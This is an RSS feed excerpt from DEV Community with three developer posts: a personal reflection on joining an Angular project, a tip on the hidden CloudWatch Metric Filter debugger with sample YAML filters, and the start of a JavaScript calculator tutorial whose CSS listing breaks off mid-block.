<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Learning to get unattached</title>
      <author>Laurence Ininda</author>
      <pubDate>Sat, 05 Jun 2021 19:45:08 +0000</pubDate>
      <link>https://dev.to/lbugasu/learning-to-get-unattached-24j9</link>
      <guid>https://dev.to/lbugasu/learning-to-get-unattached-24j9</guid>
      <description>&lt;p&gt;I &lt;em&gt;recently&lt;/em&gt; joined a team working on an &lt;strong&gt;Angular&lt;/strong&gt; project (more about that later) but also had to deal with trying to find a place to live. Yes, at the moment, I am a nomad who decided I would travel to different cities before I settle down somewhere later in the summer. &lt;/p&gt;

&lt;p&gt;I recently had that feeling of having worked placed so much effort in learning something and finally have the opportunity to use this newly acquired skill. In my case, I was finally getting the hang of using &lt;a href="https://ngrx.io/"&gt;NGRX&lt;/a&gt; for state management on an angular application until I realized that all of the state in the application I was working on was using &lt;a href="https://dev.to/avatsaev/simple-state-management-in-angular-with-only-services-and-rxjs-41p8"&gt;Services and RXJS&lt;/a&gt; ü§Ø. &lt;/p&gt;

&lt;p&gt;And because I very well understood how to use NGRX, it was compelling to see how others had implemented state management without the need for an external library. Needless to say, this was one place I needed to take a step back in order to be reminded that there's always more than one way to tackle a hurdle or issue. &lt;/p&gt;

&lt;p&gt;As of now, I will have to delay my desire to have the ideal workstation, and learn how to develop in any space I environment as I travel to different places - and much of this will require a certain level of unlearning and establishing habits that help me become a better developer and person. I have taken to early morning runs/walks to break the monotony of my sun-light deprived room and bumped into this little gift:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--X-cBIOH3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dwokig4krlkr26uaev7t.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--X-cBIOH3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dwokig4krlkr26uaev7t.jpg" alt="At the Philadelphia Flower Show 2021 at FDR Park"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Look out for &lt;strong&gt;Blog posts every Saturday&lt;/strong&gt;üéè and &lt;strong&gt;Technical articles every Wednesday&lt;/strong&gt;‚ú®&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;small&gt;Cover Photo by &lt;a href="https://unsplash.com/@heysupersimi?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Simone Hutsch&lt;/a&gt; on &lt;a href="https://unsplash.com/s/photos/creative?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;

</description>
      <category>productivity</category>
      <category>angular</category>
      <category>blog</category>
    </item>
    <item>
      <title>The hidden CloudWatch Metric Filter Debugger</title>
      <author>Gert Leenders</author>
      <pubDate>Sat, 05 Jun 2021 19:42:35 +0000</pubDate>
      <link>https://dev.to/aws-builders/the-hidden-cloudwatch-metric-filter-debugger-2efc</link>
      <guid>https://dev.to/aws-builders/the-hidden-cloudwatch-metric-filter-debugger-2efc</guid>
      <description>&lt;p&gt;Today I want to zoom in on CloudWatch Metric Filters. I've been a loyal CloudWatch user for years but only recently I stumbled upon the "hidden" CloudWatch Metric Filter Debugger. You can imagine the surprise on my face üò≤. This debugger is a hidden gem that helps write and test metric filter Patterns.&lt;/p&gt;

&lt;p&gt;If you're not familiar with &lt;a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/MonitoringLogData.html"&gt;CloudWatch Metric Filters&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Metric filters define the terms and patterns to look for in log data as it is sent to CloudWatch Logs. CloudWatch Logs uses these metric filters to turn log data into numerical CloudWatch metrics that you can graph or set an alarm on.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With a proper Metric Filter and alarm in place, you get notified whenever a particular message is logged to CloudWatch. The hardest part of the setup is writing the filter pattern itself. A correct pattern will just capture the things of interest and ignore everything else (avoiding false positives).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/FilterAndPatternSyntax.html"&gt;The Metric Filter Syntax&lt;/a&gt; is fairly easy and concise, but it can be challenging to get a perfect filter pattern.&lt;/p&gt;

&lt;p&gt;Here's an example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;  &lt;span class="na"&gt;CloudInitLogGroupFilter&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;Type&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;AWS::Logs::MetricFilter&lt;/span&gt;
    &lt;span class="na"&gt;Properties&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;FilterPattern&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;[(w1=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*ERROR*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;||&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;w1=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*Error*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;||&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;w1=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*error*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;)]"&lt;/span&gt;
      &lt;span class="na"&gt;LogGroupName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;!Ref&lt;/span&gt; &lt;span class="s"&gt;CloudInitLogGroup&lt;/span&gt;
      &lt;span class="na"&gt;MetricTransformations&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;MetricValue&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;1"&lt;/span&gt;
          &lt;span class="na"&gt;DefaultValue&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
          &lt;span class="na"&gt;MetricNamespace&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;SomeNamespace&lt;/span&gt;
          &lt;span class="na"&gt;MetricName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;!Sub&lt;/span&gt; &lt;span class="s"&gt;cloud-init-${EnvironmentName}-errors&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Often you'll start writing only match criteria to extend these with exceptions later once you run into false positives.&lt;/p&gt;

&lt;p&gt;An extended filter ignoring noise:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;  &lt;span class="na"&gt;HttpdErrorsLogGroupFilter&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="na"&gt;Type&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;AWS::Logs::MetricFilter&lt;/span&gt;
    &lt;span class="na"&gt;Properties&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;FilterPattern&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;[(w1=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*ERROR*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;||&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;w1=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*Error*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;||&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;w1=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*error*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;)&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;w1!=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*IO&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;ERROR*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;w1!=&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;*tlsmc_cert_create_hash_symlink*&lt;/span&gt;&lt;span class="se"&gt;\"&lt;/span&gt;&lt;span class="s"&gt;]"&lt;/span&gt;
      &lt;span class="na"&gt;LogGroupName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;!Ref&lt;/span&gt; &lt;span class="s"&gt;HttpdErrorsLogGroup&lt;/span&gt;
      &lt;span class="na"&gt;MetricTransformations&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;MetricValue&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="s"&gt;1"&lt;/span&gt;
          &lt;span class="na"&gt;DefaultValue&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
          &lt;span class="na"&gt;MetricNamespace&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;SomeNamespace&lt;/span&gt;
          &lt;span class="na"&gt;MetricName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;!Sub&lt;/span&gt; &lt;span class="s"&gt;httpd-errors-${EnvironmentName}-errors&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now, the eye-opener for me: apparently, it's possible to debug your Metric Filters in the AWS Web Console üíé.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#meet-the-cloudwatch-metric-filter-debugger"&gt;
  &lt;/a&gt;
  Meet the CloudWatch Metric Filter Debugger
&lt;/h2&gt;

&lt;p&gt;To find the Metric Filter Debugger, go to the detail page of a Log Group that contains a Metrics Filter, then click the "Metrics" tap followed by the Metric Filter link.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HGO5DenC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/owi76f0m5fq33sjp0h1j.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HGO5DenC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/owi76f0m5fq33sjp0h1j.jpg" alt="Metric Filter"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ta-da there's the debugger:&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--k3XXwKS5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vlapd2rts1l2opl7vj2y.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--k3XXwKS5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vlapd2rts1l2opl7vj2y.jpg" alt="Metric Filter Debugger"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Needless to say that it's a lot easier to test your Metrics Filter using this Debugger. It saved me at least a few trial-and-error deployment cycles üòâ.&lt;/p&gt;

&lt;p&gt;Enjoy and until next time!&lt;/p&gt;

</description>
      <category>aws</category>
      <category>cloud</category>
      <category>devops</category>
      <category>tooling</category>
    </item>
    <item>
      <title>Create A Javascript Calculator</title>
      <author>IsteakShupto</author>
      <pubDate>Sat, 05 Jun 2021 19:31:39 +0000</pubDate>
      <link>https://dev.to/isteakshupto/create-a-javascript-calculator-20bf</link>
      <guid>https://dev.to/isteakshupto/create-a-javascript-calculator-20bf</guid>
      <description>&lt;p&gt;Github Source Code : &lt;a href="https://github.com/IsteakShupto/calculator"&gt;Click here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Live Project link : &lt;a href="https://javascript-calculator-project.netlify.app/"&gt;Click here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For the html part we will create all the required &lt;code&gt;button&lt;/code&gt; for the calculator and the &lt;code&gt;input[type="text"]&lt;/code&gt; which will be our screen, where we will show user the calculation and the result.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;"UTF-8"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;"X-UA-Compatible"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"IE=edge"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"viewport"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1.0"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Calculator&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"stylesheet"&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"./css/style.css"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"shortcut icon"&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"./image/favicon.png"&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"image/x-icon"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"container"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"calculator"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"screen"&lt;/span&gt; &lt;span class="na"&gt;disabled&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

            &lt;span class="nt"&gt;&amp;lt;/input&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"all-btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"one btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;1&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"two btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;2&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"three btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;3&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"plus btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;+&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"four btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;4&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"five btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;5&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"six btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;6&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"minus btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;-&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"seven btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;7&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"eight btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;8&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"nine btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;9&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"times btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;√ó&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"zero btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;0&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"clear"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;C&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"equal equal-btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;span class="ni"&gt;&amp;amp;equals;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"division btn"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;√∑&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

    &lt;span class="c"&gt;&amp;lt;!--Javascript--&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"./js/script.js"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Then we will css flexbox to center our calculator both horizontally and vertically and we will use css grid to create the &lt;br&gt;
layout for the calculator.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@import&lt;/span&gt; &lt;span class="sx"&gt;url(https://fonts.googleapis.com/css?family=Karla:200,300,regular,500,600,700,800,200italic,300italic,italic,500italic,600italic,700italic,800italic)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nd"&gt;:root&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="py"&gt;--karla&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;"Karla"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sans-serif&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;padding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;box-sizing&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;border-box&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;font-family&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;--karla&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#1F2937&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.calculator&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;min-height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;100vh&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;flex&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;flex-direction&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;column&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;justify-content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;align-items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.screen&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;25rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;6.5rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;3.7rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#ffffff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0.08rem&lt;/span&gt; &lt;span class="nb"&gt;solid&lt;/span&gt; &lt;span class="no"&gt;white&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-family&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;--karla&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#536DFE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
